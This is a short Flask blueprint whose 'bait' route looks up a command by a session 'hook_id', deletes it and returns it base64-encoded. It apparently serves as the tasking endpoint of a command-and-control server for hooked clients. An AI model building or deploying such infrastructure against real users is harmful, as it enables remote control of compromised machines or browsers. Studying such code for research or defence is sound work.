from flask import Blueprint, session, jsonify, abort
import base64
from api.extensions import db
from .models import Command

bp = Blueprint('command', __name__)

@bp.route('/', methods=['GET', 'POST'])
def bait():
    from api.server import app
    hook_id = session.get('hook_id')
    if not hook_id:
        abort(403)

    command_row = Command.query.get(hook_id)
    if not command_row:
        app.logger.info("No commands found in the database")
        abort(404)
    
    # Retrieve the command attribute
    command_value = command_row.command

    # Delete the first Command object from the database
    db.session.delete(command_row)
    db.session.commit()

    app.logger.info(f"Retrieved and deleted the first command: {command_value}")
    return jsonify(command=base64.b64encode(command_value.encode()).decode())